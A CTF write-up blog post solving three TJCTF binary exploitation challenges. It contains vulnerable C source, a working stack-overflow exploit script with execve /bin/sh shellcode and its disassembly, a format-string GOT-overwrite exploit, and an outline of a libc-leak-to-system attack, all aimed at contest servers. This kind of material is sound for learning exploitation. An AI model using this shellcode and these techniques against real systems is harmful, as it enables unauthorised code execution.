
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="author" content="F3real" />
        <meta name="keywords" content="ctf,pwnable,binary exploitation,GOT" />
        <meta name="description" content="How to solve TJCTF Binary exploitation challenges part 2" />


    <title>TJCTF Binary exploitation part 2 - EnSec blog</title>

    <link href="https://f3real.github.io/theme/css/combined.css" rel="stylesheet" />

    <!-- Feeds -->
</head>
<body data-spy="scroll" data-target="#scrollspy">
    <div id="wrapper">
        <!-- Sidebar -->
        <nav id="sidebar-wrapper-small" class="twitchy-background">
            <ul id="accordion-small" class="sidebar-nav sidebar-nav-small">
                <li>
        <a href="https://f3real.github.io" title="EnSec blog" class="collapsed">
            <span class="fas fa-home"></span>
        </a>
    </li>
                <li class="nav-divider"></li>
                <li>
        <a href="https://f3real.github.io/archives.html" title="Recent Articles" class="collapsed">
            <span class="fas fa-th-list"></span>
        </a>
    </li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion-small" href="#collapse-social-small" title="Social" class="collapsed">
                        <i class="fas fa-users padding-small"></i>
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-social-small" class="collapse ">
                    <li>
                        <a href="https://github.com/F3real" title="Github"><i class="fab fa-github-square padding-small"></i></a>
                    </li>
                    <li>
                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin"><i class="fab fa-linkedin padding-small"></i></a>
                    </li>
                </ul></li>
                <li class="nav-divider"></li>
                <li>
        <a href="#" title="Back to top" class="collapsed">
            <span class="fas fa-arrow-up"></span>
        </a>
    </li>
            </ul>
        </nav>
        <nav id="sidebar-wrapper" class="twitchy-background">
            <ul id="accordion" class="sidebar-nav">
                <li class="sidebar-brand">
                    <a href="https://f3real.github.io/">
                            <span class="fas fa-home padding-small"></span>
                            EnSec blog
                    </a>
                </li>
                    <li>
                        <a href="https://f3real.github.io/archives.html">
                            <span class="fas fa-th-list padding-small"></span>
                            Archives
                        </a>
                    </li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-social">
                        <i class="fas fa-users padding-small"></i>
                        Contact
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-social" class="sidebar_submenu collapse ">
                    <li>
                        <a href="https://github.com/F3real" title="Github">
                            <i class="fab fa-github-square padding-small"></i>
                            Github
                        </a>
                    </li>
                    <li>
                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin">
                            <i class="fab fa-linkedin padding-small"></i>
                            Linkedin
                        </a>
                    </li>
                </ul></li>
                
                <li class="nav-divider"></li>
                <li class="panel anti-panel"><ul id="collapse-pages" class="sidebar_submenu collapse ">
                </ul></li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-categories">
                        <i class="fas fa-folder-open padding-small"></i>
                        Categories
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-categories" class="sidebar_submenu collapse ">
                    <li class="active">
                        <a href="https://f3real.github.io/category/ctf.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            ctf
                            <span class="badge badge-secondary float-right categorybadge">28</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/misc.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            misc
                            <span class="badge badge-secondary float-right categorybadge">15</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/reversing.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            reversing
                            <span class="badge badge-secondary float-right categorybadge">6</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/tutorial.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            tutorial
                            <span class="badge badge-secondary float-right categorybadge">5</span>
                        </a>
                    </li>
                </ul></li>
            </ul>
        </nav>
        <!-- /#sidebar-wrapper -->
        <!-- open/close sidebar -->
        <button onclick="toggleMenu();return false;" class="btn btn-primary" id="menu-toggle">
            <span id="right-arrow" class="fas fa-chevron-right"  title="expand sidebar"></span>
            <span id="left-arrow" class="fas fa-chevron-left" title="minimize sidebar"></span>
        </button>
       <!-- /open/close sidebar -->

        <!-- Page Content -->
        <div id="page-content-wrapper">
            <div class="container-fluid">
<section id="content">
    <article>
        <div class="row">
            <div class="col-lg-10">
                <header class="page-header">
                    <h1>
                        <a href="https://f3real.github.io/tjctf_binary_part2.html"
                           rel="bookmark"
                           title="Permalink to TJCTF Binary exploitation part 2">
                            TJCTF Binary exploitation part 2
                        </a>
                        <small>
<div class="post-info">
    <div class="publish-info-block">
        <small>
            <span class="published">
                <i class="fa fa-calendar padding-small"></i><time datetime="2018-08-13T11:02:00+02:00"> Mon 13 August 2018</time>
            </span>
            <span class="category">
                <i class="fa fa-folder-open padding-small"></i><a href="https://f3real.github.io/category/ctf.html">ctf</a>
            </span>
            <span class="tags">
                <i class="fa fa-tags padding-small"></i>
                <a href="https://f3real.github.io/tag/ctf.html">ctf</a> /                 <a href="https://f3real.github.io/tag/pwnable.html">pwnable</a> /                 <a href="https://f3real.github.io/tag/binary-exploitation.html">binary exploitation</a> /                 <a href="https://f3real.github.io/tag/got.html">GOT</a>            </span>
        </small>
    </div>
</div><!-- /.post-info -->                        </small>
                    </h1>
                </header>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-10">
                <div class="entry-content">
                    <p>In this part, we are going to take a look at the last 2 of 5 original binary exploit challenges and 6th, more complex, challenge published later.</p>
<div class="toc">
<ul>
<li><a href="#online-banking">Online Banking</a></li>
<li><a href="#secure-secrets">Secure Secrets</a></li>
<li><a href="#super-secure-secrets">Super Secure Secrets</a></li>
</ul>
</div>
<h2 id="online-banking">Online Banking</h2>
<p>Letâ€™s take a look at the source:</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="cp">#define PIN_SIZE 4</span>
<span class="cp">#define NAME_SIZE 32</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">verify_pin</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">pin</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">pin_check</span><span class="p">[</span><span class="n">PIN_SIZE</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Please verify your PIN first:</span><span class="se">\n</span><span class="s">PIN: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">pin_check</span><span class="p">,</span><span class="w"> </span><span class="n">NAME_SIZE</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">pin</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">pin_check</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="n">NAME_SIZE</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
<span class="kt">char</span><span class="w"> </span><span class="n">pin</span><span class="p">[</span><span class="n">PIN_SIZE</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">gid_t</span><span class="w"> </span><span class="n">gid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getegid</span><span class="p">();</span>
<span class="w">    </span><span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="w"> </span><span class="n">gid</span><span class="p">,</span><span class="w"> </span><span class="n">gid</span><span class="p">);</span>
<span class="w">    </span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome to our Online Banking system!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;To use our system, please register an account with a 4-character PIN:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Name: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">NAME_SIZE</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;PIN: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">pin</span><span class="p">,</span><span class="w"> </span><span class="n">PIN_SIZE</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="n">getchar</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Thank you for registering! You may now use our service.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\x00&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="sc">&#39;q&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">What would you like to do?</span><span class="se">\n</span><span class="s"> d - deposit</span><span class="se">\n</span><span class="s"> w - withdraw</span><span class="se">\n</span><span class="s"> q - quit</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getchar</span><span class="p">();</span>
<span class="w">        </span><span class="n">getchar</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;d&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">verify_pin</span><span class="p">(</span><span class="n">pin</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kt">char</span><span class="w"> </span><span class="n">deposit_s</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
<span class="w">                </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;How much would you like to deposit?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="n">fgets</span><span class="p">(</span><span class="n">deposit_s</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
<span class="w">                </span><span class="n">balance</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">deposit_s</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid PIN!</span><span class="se">\n</span><span class="s">For security reasons, your account is now being locked.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;q&#39;</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;w&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">verify_pin</span><span class="p">(</span><span class="n">pin</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kt">char</span><span class="w"> </span><span class="n">deposit_s</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
<span class="w">                </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;How much would you like to withdraw?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="n">fgets</span><span class="p">(</span><span class="n">deposit_s</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
<span class="w">                </span><span class="n">balance</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">deposit_s</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid PIN!</span><span class="se">\n</span><span class="s">For security reasons, your account is now being locked.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;q&#39;</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="sc">&#39;q&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unknown command!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;d&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;w&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Your current balance is %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">balance</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Have a nice day! Please come again soon.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>Looking carefully we see that problem is in:</p>
<div class="highlight"><pre><span></span><code>fgets(pin_check, NAME_SIZE+1, stdin);
</code></pre></div>

<p>We have obvious 28 byte overflow (<code>NAME_SIZE â€” PIN_SIZE</code>). Using pwntools we can check for offsets,</p>
<div class="highlight"><pre><span></span><code>    &gt;&gt;&gt; cyclic(30,n=8)
    ......
    &gt;&gt;&gt; cyclic_find(&#39;aaaaaaad&#39;,n=8)
    17
</code></pre></div>

<p>which gives us RIP after 17 bytes. Checking binary for security measures we see that NX and PIE are disabled.</p>
<div class="highlight"><pre><span></span><code>[*] &#39;/root/ctf/tjctf/online_banking/problem&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre></div>

<p>Without PIE address of <code>name</code> is going to be constant, so it is a good place to put our shellcode. We are going to use shellcode from <a href="http://shell-storm.org/shellcode/">shell-storm.org</a>. Combining all this we get our solution :D.</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s1">&#39;</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
    <span class="n">context</span><span class="o">.</span><span class="n">os</span>   <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
    <span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;terminator&quot;</span><span class="p">,</span> <span class="s2">&quot;-e&quot;</span><span class="p">]</span>

    <span class="n">pattern</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span><span class="n">n</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">pattern</span>
    <span class="c1">#r = process(&#39;./problem&#39;)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;problem1.tjctf.org&#39;</span><span class="p">,</span> <span class="mi">8005</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name:&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;PIN:&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;q - quit&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">)</span>
    <span class="c1">#gdb.attach(r)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">17</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6010a0</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

<p>Shellcode:</p>
<div class="highlight"><pre><span></span><code>   0:    31 c0                    xor    eax, eax
   2:    48 bb d1 9d 96 91 d0     movabs rbx, 0xff978cd091969dd1
   9:    8c 97 ff  
   c:    48 f7 db                 neg    rbx
   f:    53                       push   rbx
  10:    54                       push   rsp
  11:    5f                       pop    rdi
  12:    99                       cdq
  13:    52                       push   rdx
  14:    57                       push   rdi
  15:    54                       push   rsp
  16:    5e                       pop    rsi
  17:    b0 3b                    mov    al, 0x3b
  19:    0f 05                    syscall
</code></pre></div>

<h2 id="secure-secrets">Secure Secrets</h2>
<p>In this problem, we are only given binary, so one of the first steps is to use IDA and try to see how the program works. Two, for us, the most interesting functions are:</p>
<p><img alt="Secure secrets get_message function" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_8_13_SecureSecrets_getMessage.png"></p>
<p><img alt="Secure secrets get_secret function" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_8_13_SecureSecrets_getSecret.png"></p>
<p>We see that the program has format string vulnerability in <code>get_message</code>. Since to get our flag we just need to call <code>get_secret</code>, we can simply overwrite GOT entry of <code>exit</code> function (called at the end of main). Exploring stack we see that we can access our input at 35th position. Our exploit:</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">explore_stack</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span>
    <span class="n">p</span> <span class="o">+=</span> <span class="s1">&#39;%p&#39;</span><span class="o">*</span><span class="mi">29</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;p&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;p&quot;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">access_stack</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span>
    <span class="n">p</span> <span class="o">+=</span> <span class="s1">&#39;|%35$p|&#39;</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;p&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;p&quot;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">overwrite_exit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804a02c</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="si">%34574c</span><span class="s1">|%35$hn|&#39;</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;p&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
    <span class="c1">#gdb.attach(r)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;p&quot;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
    <span class="n">context</span><span class="o">.</span><span class="n">os</span>   <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
    <span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;terminator&quot;</span><span class="p">,</span> <span class="s2">&quot;-e&quot;</span><span class="p">]</span>

    <span class="c1">#r = process(&#39;./secure&#39;)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;problem1.tjctf.org&#39;</span><span class="p">,</span> <span class="mi">8008</span><span class="p">)</span>

    <span class="n">overwrite_exit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="c1">#gdb.attach(r)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

<h2 id="super-secure-secrets">Super Secure Secrets</h2>
<p>This was the last binary exploit challenge in TJCTF. Like in the previous one we are not given source code, so we are going to use IDA to check how the program works. At first, IDA didnâ€™t produce good results, but with a bit few manual changes we get the following:</p>
<p><img alt="Super secure secrets secure_service" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_8_13_SuperSecureSecrets.png"></p>
<p><img alt="Super secure secrets get_message" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_8_13_SuperSecureSecrets_getMessage.png"></p>
<p><img alt="Super secure secrets set_message" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_8_13_SuperSecureSecrets_setMessage.png"></p>
<p>Run file on binary:</p>
<div class="highlight"><pre><span></span><code><span class="nl">super_secure</span><span class="p">:</span><span class="w"> </span><span class="n">ELF</span><span class="w"> </span><span class="mi">64</span><span class="o">-</span><span class="nc">bit</span><span class="w"> </span><span class="n">LSB</span><span class="w"> </span><span class="n">executable</span><span class="p">,</span><span class="w"> </span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="n">SYSV</span><span class="p">),</span><span class="w"> </span><span class="n">dynamically</span><span class="w"> </span><span class="n">linked</span><span class="p">,</span><span class="w"> </span><span class="n">interpreter</span><span class="w"> </span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span><span class="p">,</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="mf">2.6.32</span><span class="p">,</span><span class="w"> </span><span class="n">BuildID</span><span class="o">[</span><span class="n">sha1</span><span class="o">]=</span><span class="mi">19</span><span class="n">eaa9a0ae168cebfc88191546db1f1da54328a4</span><span class="p">,</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">stripped</span>
</code></pre></div>

<p>Checksec:</p>
<div class="highlight"><pre><span></span><code>RELRO          STACK CANARY     NX            PIE

Partial RELRO  Canary found     NX enabled    No PIE
</code></pre></div>

<p>Like Secure Secrets it also has format string exploit in <code>get_message</code> function, but this time there is no function to call and get the flag. The second problem is that the program exits after getting a message first time, so we canâ€™t do multiple reads/writes. All in all, this challenge was very similar to Config Console from PicoCTF 2017. We have to exploit it in multiple steps:</p>
<ol>
<li>
<p>overwrite <code>memset</code> GOT entry with the address of <code>secure_service</code> so we can use format string vulnerability multiple times. Since <code>memset</code> is called only after <code>printf</code>, the address is not resolved at the time we trigger vulnerability for the 1st time so itâ€™s enough to overwrite 2 bytes (<code>%hn</code>).</p>
</li>
<li>
<p>Leak address of <code>fgets</code> and <code>__libc_start_main</code> to determine libc base address and calculate <code>system</code> address.</p>
</li>
<li>
<p>Overwrite GOT entry of <code>strlen</code> with <code>system</code>. After this, we can just store the new message with content <code>/bin/sh</code> and get the flag.</p>
</li>
</ol>
